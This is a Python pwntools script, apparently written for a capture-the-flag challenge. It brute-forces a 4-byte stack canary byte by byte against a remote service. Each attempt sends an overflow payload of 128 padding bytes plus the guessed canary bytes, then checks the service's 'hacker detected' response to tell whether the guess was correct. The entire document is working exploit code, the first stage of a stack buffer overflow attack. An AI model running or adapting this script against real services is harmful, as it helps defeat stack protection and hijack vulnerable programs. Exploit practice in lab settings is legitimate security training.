from pwn import *
from tqdm import tqdm

HOST = "10.0.118.104"
PORT = 4456

context.log_level = "error"

canary = b""

def try_guess(prefix, guess):
    p = remote(HOST, PORT)

    p.sendline(b"./vuln")

    payload = b"A"*128 + prefix + bytes([guess])
    p.sendline(str(len(payload)).encode())

    p.recvuntil(b"Now enter the string")
    p.send(payload + b"\n")

    out = p.recvall(timeout=1)

    p.close()

    return b"hacker detected" not in out


for i in range(4):
    found = False

    for guess in tqdm(range(256), desc=f"Byte {i+1}/4"):
        if try_guess(canary, guess):
            canary += bytes([guess])
            print("found:", hex(guess))
            found = True
            break

    if not found:
        print("Failed at byte", i+1)
        break

print("CANARY =", canary)